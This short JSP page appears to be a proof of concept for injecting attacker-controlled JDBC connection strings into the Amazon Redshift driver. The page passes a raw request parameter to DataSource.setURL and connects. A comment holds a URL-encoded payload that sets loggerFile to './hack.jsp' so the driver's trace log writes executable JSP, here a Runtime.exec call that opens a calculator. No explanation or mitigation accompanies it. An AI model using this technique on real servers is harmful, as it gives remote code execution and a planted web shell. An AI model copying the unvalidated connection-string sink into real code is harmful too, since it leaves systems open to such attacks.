<%@ page import="com.amazon.redshift.jdbc.DataSource" %>
<%@ page import="java.sql.Connection" %>
<html>
<body>

<%
    // jdbc:redshift://baidu.comxx/dev;loggerFile=./hack.jsp;loggerLevel=TRACE;connectTimeout=%3c%25%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%6f%70%65%6e%20%2d%61%20%63%61%6c%63%75%6c%61%74%6f%72%22%29%3b%25%3e
    String connStr = request.getParameter("jdbc");
    DataSource ds = new DataSource();
    ds.setURL(connStr);
    Connection connection = ds.getConnection();
%>


</body>
</html>
